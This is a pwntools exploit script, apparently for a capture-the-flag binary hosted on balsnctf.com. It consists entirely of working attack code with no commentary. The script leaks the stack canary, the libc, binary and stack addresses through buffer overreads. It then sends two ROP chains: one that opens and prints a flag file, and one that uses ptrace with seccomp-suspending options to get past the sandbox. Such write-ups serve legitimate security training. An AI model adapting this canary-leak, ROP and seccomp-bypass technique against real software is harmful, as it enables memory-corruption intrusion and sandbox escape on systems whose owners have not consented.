#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./chall', checksec=False)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False) # ubuntu 22.04

if args.REMOTE:
	p = remote('asian-parents.balsnctf.com', 7777)
else:
	p = process(binary.path)


# parent
p.sendlineafter(b'> ',b'foo')


# child: canary leak
p.sendlineafter(b'> ',b'0')
p.sendafter(b'> ',(0x98 - 0x10 + 1) * b'A')
p.recvuntil((0x98 - 0x10 + 1) * b'A')

canary = u64(b'\0' + p.recv(7))
log.info('canary: {x}'.format(x = hex(canary)))


# child: libc leak
p.sendlineafter(b'> ',b'0')
p.sendafter(b'> ',(0x98) * b'A')
p.recvuntil((0x98) * b'A')

libc.address = u64(p.recv(6) + b'\0\0') - 0x29d90 # libc.sym.__libc_start_call_main - 128
log.info('libc.address: {x}'.format(x = hex(libc.address)))


# libc gadgets
pop_rdi = libc.search(asm('pop rdi; ret')).__next__()
pop_rsi = libc.search(asm('pop rsi; ret')).__next__()
pop_rdx_r12 = libc.search(asm('pop rdx; pop r12; ret')).__next__()
xor_r10d = libc.search(asm('xor r10d, r10d; mov eax, r10d; ret')).__next__()
add_r10_rdi_0x20 = libc.search(asm('add r10, qword ptr [rdi + 0x20]; mov rax, r10; ret')).__next__()
pop_rax = libc.search(asm('pop rax; ret')).__next__()
mov_rax_ptr_rax = libc.search(asm('mov rax, qword ptr [rax]; ret')).__next__()
mov_ptr_rdi_rax = libc.search(asm('mov qword ptr [rdi], rax; xor eax, eax; ret')).__next__()
syscall = libc.search(asm('syscall; ret')).__next__()


# parent: binary.address leak
p.sendlineafter(b'> ',b'1')
p.sendafter(b'> ',(0x98 + 0x8 * 2) * b'A')
p.sendlineafter(b'> ',b'2')
p.recvuntil((0x98 + 0x8 * 2) * b'A')
binary.address = u64(p.recv(6) + b'\0\0') - binary.sym.main
log.info('binary.address: {x}'.format(x = hex(binary.address)))


# parent: stack leak
# 0x007ffec31df1a8â”‚+0x00c8: 0x007ffec31df298
p.sendlineafter(b'> ',b'1')
p.sendafter(b'> ',(0x98 + 0x8 * 4) * b'A')
p.sendlineafter(b'> ',b'2')
p.recvuntil((0x98 + 0x8 * 4) * b'A')
buffer  = u64(p.recv(6) + b'\0\0')
buffer -= (0x007ffec31df298 - 0x007ffec31df1a8)
buffer -= (0x98 + 0x8 * 4)
log.info('buffer: {x}'.format(x = hex(buffer)))


# child: rop chain
payload  = b''
payload += b'/home/asianparent/flag.txt\0'
payload += (0x98 - len(payload) - 0x10) * b'A'
payload += p64(canary)
payload += (0x98 - len(payload)) * b'B'

payload += p64(pop_rdi)
payload += p64(1)
payload += p64(libc.sym.sleep)

payload += p64(pop_rdi)
payload += p64(buffer)
payload += p64(pop_rsi)
payload += p64(0)
payload += p64(pop_rdx_r12)
payload += 2 * p64(0)
payload += p64(libc.sym.open)

payload += p64(pop_rdi)
payload += p64(buffer + len(payload) + 0x8 * 3)
payload += p64(mov_ptr_rdi_rax)
payload += p64(pop_rdi)
payload += p64(0xdeadbeef)
payload += p64(pop_rsi)
payload += p64(buffer)
payload += p64(pop_rdx_r12)
payload += 2 * p64(100)
payload += p64(pop_rax)
payload += p64(constants.SYS_read)
payload += p64(syscall)

payload += p64(pop_rdi)
payload += p64(1)
payload += p64(pop_rax)
payload += p64(constants.SYS_write)
payload += p64(syscall)

payload += p64(pop_rdi)
payload += p64(0)
payload += p64(pop_rax)
payload += p64(constants.SYS_exit)
payload += p64(syscall)

assert(len(payload) < 0x200)

p.sendlineafter(b'> ',b'0')
p.sendafter(b'> ',payload)


# parent: rop chain
PTRACE_SEIZE = 0x4206
PTRACE_O_SUSPEND_SECCOMP = (1 << 21)
PTRACE_O_TRACESECCOMP = 0x00000080

payload  = b''
payload += 0x20 * b'A'
if args.REMOTE:
	payload += p64(PTRACE_O_TRACESECCOMP)
else:
	payload += p64(PTRACE_O_SUSPEND_SECCOMP)
payload += (0x98 - len(payload) - 0x10) * b'B'
payload += p64(canary)
payload += (0x98 - len(payload)) * b'C'

payload += p64(pop_rax)
payload += p64(binary.sym.child)
payload += p64(mov_rax_ptr_rax)
payload += p64(pop_rdi)
payload += p64(buffer + len(payload) + 0x8 * 3)
payload += p64(mov_ptr_rdi_rax)
payload += p64(pop_rsi)
payload += p64(0xdeadbeef)
payload += p64(pop_rdx_r12)
payload += 2 * p64(0)
payload += p64(xor_r10d)
payload += p64(pop_rdi)
payload += p64(buffer)
payload += p64(add_r10_rdi_0x20)
payload += p64(pop_rdi)
payload += p64(PTRACE_SEIZE)
payload += p64(pop_rax)
payload += p64(constants.SYS_ptrace)
payload += p64(syscall)

payload += p64(pop_rdi)
payload += p64(0)
payload += p64(pop_rsi)
payload += p64(0)
payload += p64(libc.sym.waitpid)

payload += p64(pop_rdi)
payload += p64(0)
payload += p64(pop_rax)
payload += p64(constants.SYS_exit)
payload += p64(syscall)

assert(len(payload) < 0x200)

p.sendlineafter(b'> ',b'1')
p.sendafter(b'> ',payload)
p.sendlineafter(b'> ',b'3')
p.recvuntil(b'effective!\n')
_ = p.recvuntil(b'}').decode()
p.close()
print(_)

